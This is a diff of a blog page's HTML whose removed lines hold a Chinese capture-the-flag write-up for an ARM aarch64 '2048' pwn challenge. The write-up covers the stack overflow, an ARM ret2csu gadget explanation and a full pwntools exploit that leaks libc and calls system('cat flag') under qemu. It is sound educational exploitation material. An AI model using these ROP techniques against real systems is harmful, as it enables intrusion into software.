-                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>6.6k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>6 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>2048 复现</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>PS：ARM 的 libc 和 X86 的还不一样</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2048</span>: ELF <span class="number">64</span>-bit LSB executable, ARM aarch64, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so<span class="number">.1</span>, BuildID[sha1]=<span class="number">2</span>ad2206f21bc8a991f4874f2b2ca0cc6e6b973c0, <span class="keyword">for</span> GNU/Linux <span class="number">3.7</span><span class="number">.0</span>, stripped                  </span><br><span class="line">    Arch:     aarch64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>64位，dynamically，ARM，开了 NX，Full RELRO</li>
-</ul>
-<p>这是 ARM 的程序，需要用 qemu 来模拟 ARM 虚拟机（环境我已经搭好了）</p>
-<p>使用如下命令来启动 qemu：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./[pwn]</span><br></pre></td></tr></table></figure>
-<p><strong>漏洞分析</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">20</span>]; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;You win!&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Do you want to continue playing? [y/n]: &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);                       <span class="comment">// 栈溢出</span></span><br><span class="line">result = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> ( buf[<span class="number">0</span>] == <span class="string">&#x27;Y&#x27;</span> || buf[<span class="number">0</span>] == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> game_close();</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>数组 buf 溢出，没有开 canary 可以直接打 ROP</li>
-</ul>
-<p><strong>入侵思路</strong></p>
-<p>在进行栈溢出之前，需要先完成一个游戏：2048</p>
-<ul>
-<li>B站学习视频：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Er4y1M7H6?spm_id_from=333.337.search-card.all.click&amp;vd_source=e57d5ad6d12068c1395d17b2d54c58d1">怎么玩2048_bilibili</a></li>
-<li>在 github 上寻找 2048 的自动化脚本：<a target="_blank" rel="noopener" href="https://github.com/SrinidhiRaghavan/AI-2048-Puzzle">SrinidhiRaghavan/AI-2048-Puzzle</a></li>
-</ul>
-<p>逆向分析发现，这个程序通过 “W” “S” “A” “D” 4个键来控制程序（具体的实现过程可以先不用管），并且程序的种子是固定的</p>
-<p>每一局游戏都是以下这个界面：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Score: <span class="number">0</span></span><br><span class="line">+------+------+------+------+</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |    <span class="number">2</span> |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|    <span class="number">2</span> |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">+------+------+------+------+</span><br></pre></td></tr></table></figure>
-<ul>
-<li>因此，只要完成一次游戏记录 payload 就可以了（我就没有跑脚本了，直接硬玩也可以）</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;sddsdsdsddssssdddsddssddddwsdsdsddssdsdsssdsddddddsssddsddddadssdsdsddddssdddddadsssswssddsdsdssddadddsdddadsdssddsdddswwwdddsddadsdddaasdsddsdsdsddsdsddsdddssdsddsddddwsdsssddsadsdsdddsddsaddwwdsddsssddsdadadsdssasdadswsdaddssssswswdssddssdsdsadwdswwwswdsdsadassddsddddadaddssdasdsdsddsddsssdsdsddddsddddwssdssdswsdssdadadssswddadawwwwwdsdaasdsadsssdsddsdssdddswwwsddssasdwwwswswdddddsdssddddddsdswswswsdsadaasdddaaddsdassdsdasasddwwdddwdsdsddsddwddsadasdssdsswdsdsassddswwdwwswdadddassdsdsddwsddsadsssddsddsddaswasdsdssaddswsswsadsssssassdsdwwsssdsdsdddddsswwdwswsddssddsssssddsdssswssddswsddssddsddsssdswssssssddwddsdwsdswswsddwsdsssdasddadasddadsadsddddswdsasssswswsddsssssdsdwswdswswdsdsswsdsddsssadssdswsaaadsddssdswsswswddsddsdsssdadasdaassdwsdasdaadsdsddsddsadsdssssssddsdadsdsdsaddddsswdasasdddsddsadsdddsddsssdadadsaaddddssdwdddsadwdasddssddsssdsdsdddssaaaaasdsaddddswwdsdasswdwwswdsswsdsdddssswwsddssdwdssdsssssssdadsdadwdssdadddwddsddssdadddddddaadasddsddwdsdadaaaaaaadswds&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>接下来的 ROP 就是重头戏了，先介绍一下 ARM 的 ret2csu：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:                               loc_4020D8                              ; CODE XREF: sub_402070+<span class="number">3</span>C↑j</span><br><span class="line">.text: F3 <span class="number">53</span> <span class="number">41</span> A9                   LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text: F5 <span class="number">5B</span> <span class="number">42</span> A9                   LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text: F7 <span class="number">63</span> <span class="number">43</span> A9                   LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text: FD <span class="number">7B</span> C4 A8                   LDP             X29, X30, [SP+var_s0],#<span class="number">0x40</span></span><br><span class="line">.text: C0 <span class="number">03</span> <span class="number">5F</span> D6                   RET</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:                               loc_4020B8                              ; CODE XREF: sub_402070+<span class="number">64</span>↓j</span><br><span class="line">.text: A3 <span class="number">7</span>A <span class="number">73</span> F8                   LDR             X3, [X21,X19,LSL#<span class="number">3</span>]</span><br><span class="line">.text: E2 <span class="number">03</span> <span class="number">18</span> AA                   MOV             X2, X24</span><br><span class="line">.text: <span class="number">73</span> <span class="number">06</span> <span class="number">00</span> <span class="number">91</span>                   ADD             X19, X19, #<span class="number">1</span></span><br><span class="line">.text: E1 <span class="number">03</span> <span class="number">17</span> AA                   MOV             X1, X23</span><br><span class="line">.text: E0 <span class="number">03</span> <span class="number">16</span> <span class="number">2</span>A                   MOV             W0, W22</span><br><span class="line">.text: <span class="number">60</span> <span class="number">00</span> <span class="number">3F</span> D6                   BLR             X3</span><br></pre></td></tr></table></figure>
-<ul>
-<li><code>LDP &lt;reg0&gt;, &lt;reg1&gt;, [&lt;reg2|SP&gt;&#123;, #&lt;imm&gt;&#125;]</code>：<ul>
-<li>把 <code>SP+&lt;imm&gt;</code>上的值存入<code>&lt;reg0&gt;, &lt;reg1&gt;</code></li>
-<li>常用于恢复寄存器的数据</li>
-<li>基地址偏移量模式，“{}”大括号表示可选的意思</li>
-</ul>
-</li>
-<li><code>LDR &lt;reg0&gt;, [&lt;reg1&gt;, &lt;reg2&gt;, LSL#3]</code>：<ul>
-<li>查找到 <code>&lt;reg1&gt;</code>（基地址）加上 <code>&lt;reg2&gt;</code> 右移3位（偏移地址）的地址</li>
-<li>把其中的内容赋值给 <code>&lt;reg0&gt;</code></li>
-</ul>
-</li>
-<li><code>BLR &lt;Xm&gt;</code>：<ul>
-<li>跳转到由 <code>&lt;Xm&gt;</code> 目标寄存器指定的地址处</li>
-<li>同时将下一条指令存放到 <code>&lt;X30&gt;</code> 寄存器中 </li>
-</ul>
-</li>
-</ul>
-<p>利用模板：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">csu1_addr = </span><br><span class="line">csu2_addr = </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2csu</span>(<span class="params">func_addr, arg0, arg1, arg2</span>):</span></span><br><span class="line">    payload = p64(csu1_addr) <span class="comment"># ret</span></span><br><span class="line">    payload += p64(csu1_addr) <span class="comment"># x29</span></span><br><span class="line">    payload += p64(csu2_addr) <span class="comment"># x30</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># x19</span></span><br><span class="line">    payload += p64(<span class="number">1</span>) <span class="comment"># x20</span></span><br><span class="line">    payload += p64(func_addr) <span class="comment"># x21</span></span><br><span class="line">    payload += p64(arg0) <span class="comment"># x22 (x0)</span></span><br><span class="line">    payload += p64(arg1) <span class="comment"># x23 (x1)</span></span><br><span class="line">    payload += p64(arg2) <span class="comment"># x24 (x2)</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
-<ul>
-<li>注意：程序并不会直接调用 <code>func_addr</code>，而是会调用 <code>func_addr</code> 指向的地址</li>
-</ul>
-<p>最后说一下 ARM 环境的问题：</p>
-<ul>
-<li>绝大多数 <code>ARM</code> 架构的题都是在 <code>qemu</code> 模拟出的环境中跑的，而 <code>qemu</code> 没有 <code>NX</code> 和 <code>PIE</code>（即使题目所给的二进制文件开了 <code>NX</code> 和 <code>PIE</code> 保护，也只是对真机环境奏效），也就是说，<code>qemu</code> 中所有地址都是有可执行权限的（包括堆栈，甚至 <code>bss</code> 段等），然后 <code>libc_base</code> 和 <code>proc_base</code> 每次跑都是固定的</li>
-<li>跑 <code>qemu</code> 的时候，<code>libc_base</code> 一般都是 <code>0x4000XXX000</code> 这样的地址，因此泄露数据的时候会被 <code>\x00</code> 截断，其实只需要泄露后三个字节（后六位），然后加上 <code>0x4000000000</code> 即可得到泄露出的 <code>libc</code> 地址（本地和远程的偏移可能不同）</li>
-</ul>
-<p>于是我们就先调用 GOT 里面的 <code>puts</code> 随便泄露一个 GOT 里面的函数，计算出 <code>libc_base</code>，然后利用 ret2csu 执行 ROP</p>
-<p>完整 exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>,<span class="string">&#x27;./20481&#x27;</span>])</span><br><span class="line"><span class="comment">#p=process([&#x27;qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;/usr/aarch64-linux-gnu/&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;./20481&#x27;])</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./20481&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">csu1_addr=<span class="number">0x4020D8</span></span><br><span class="line">csu2_addr=<span class="number">0x4020B8</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">csu1_addr=<span class="number">0x04020D8</span></span><br><span class="line">csu2_addr=<span class="number">0x04020B8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2csu</span>(<span class="params">func_addr, arg0, arg1, arg2</span>):</span></span><br><span class="line">    payload = p64(csu1_addr) <span class="comment"># ret</span></span><br><span class="line">    payload += p64(csu1_addr) <span class="comment"># x29</span></span><br><span class="line">    payload += p64(csu2_addr) <span class="comment"># x30</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)  <span class="comment"># x19</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)  <span class="comment"># x20</span></span><br><span class="line">    payload += p64(func_addr)  <span class="comment"># x21</span></span><br><span class="line">    payload += p64(arg0)  <span class="comment"># x22 (x0)</span></span><br><span class="line">    payload += p64(arg1)  <span class="comment"># x23 (x1)</span></span><br><span class="line">    payload += p64(arg2)  <span class="comment"># x24 (x2)</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">puts_addr = <span class="number">0x4131B8</span></span><br><span class="line">__libc_start_main_got = <span class="number">0x412f68</span></span><br><span class="line">__libc_start_main_libc = <span class="number">0x5500856ba8</span></span><br><span class="line">puts_got = <span class="number">0x412f88</span></span><br><span class="line">libc_base = __libc_start_main_libc - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system_libc = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.send(p64(system_libc)+<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;sddsdsdsddssssdddsddssddddwsdsdsddssdsdsssdsddddddsssddsddddadssdsdsddddssdddddadsssswssddsdsdssddadddsdddadsdssddsdddswwwdddsddadsdddaasdsddsdsdsddsdsddsdddssdsddsddddwsdsssddsadsdsdddsddsaddwwdsddsssddsdadadsdssasdadswsdaddssssswswdssddssdsdsadwdswwwswdsdsadassddsddddadaddssdasdsdsddsddsssdsdsddddsddddwssdssdswsdssdadadssswddadawwwwwdsdaasdsadsssdsddsdssdddswwwsddssasdwwwswswdddddsdssddddddsdswswswsdsadaasdddaaddsdassdsdasasddwwdddwdsdsddsddwddsadasdssdsswdsdsassddswwdwwswdadddassdsdsddwsddsadsssddsddsddaswasdsdssaddswsswsadsssssassdsdwwsssdsdsdddddsswwdwswsddssddsssssddsdssswssddswsddssddsddsssdswssssssddwddsdwsdswswsddwsdsssdasddadasddadsadsddddswdsasssswswsddsssssdsdwswdswswdsdsswsdsddsssadssdswsaaadsddssdswsswswddsddsdsssdadasdaassdwsdasdaadsdsddsddsadsdssssssddsdadsdsdsaddddsswdasasdddsddsadsdddsddsssdadadsaaddddssdwdddsadwdasddssddsssdsdsdddssaaaaasdsaddddswwdsdasswdwwswdsswsdsdddssswwsddssdwdssdsssssssdadsdadwdssdadddwddsddssdadddddddaadasddsddwdsdadaaaaaaadswds&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[y/n]: &#x27;</span>)</span><br><span class="line">payload=<span class="number">40</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="comment">#payload+=ret2csu(puts_got,__libc_start_main_got,0,0)</span></span><br><span class="line"><span class="comment">#payload+=ret2csu(0x413154,(libc.search(&#x27;/bin/sh&#x27;).next())+libc_base,0,0)</span></span><br><span class="line">payload+=ret2csu(<span class="number">0x413154</span>,<span class="number">0x413154</span>+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p.recvuntil(&#x27;Bye~\n&#x27;)</span></span><br><span class="line"><span class="string">leak_addr=u64(p.recv(3).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="string">success(&quot;leak_addr &gt;&gt; &quot;+hex(leak_addr))</span></span><br><span class="line"><span class="string"># leak_addr &gt;&gt; 0x856ba8</span></span><br><span class="line"><span class="string"># __libc_start_main &gt;&gt; 0x5500856ba8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<hr>
-<p><strong>小结：</strong></p>
-<p>初入 ARM pwn，学到了不少 ARM 的知识：</p>
-<ul>
-<li><code>libc_base</code> 和 <code>proc_base</code> 每次跑都是固定的</li>
-<li><code>ret2csu</code> 并不会直接调用 <code>func_addr</code>，而是会调用 <code>func_addr</code> 指向的地址</li>
-</ul>
-<p>我感觉这个 2048 小游戏很有意思，有时间看看这是这么实现的</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2063,7 +2204,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">281</span>
+          <span class="site-state-item-count">282</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2076,7 +2217,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">146</span>
+        <span class="site-state-item-count">147</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -2112,12 +2253,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="Symbols count total">3.9m</span>
+    <span title="Symbols count total">4m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">59:28</span>
+    <span title="Reading time total">59:52</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
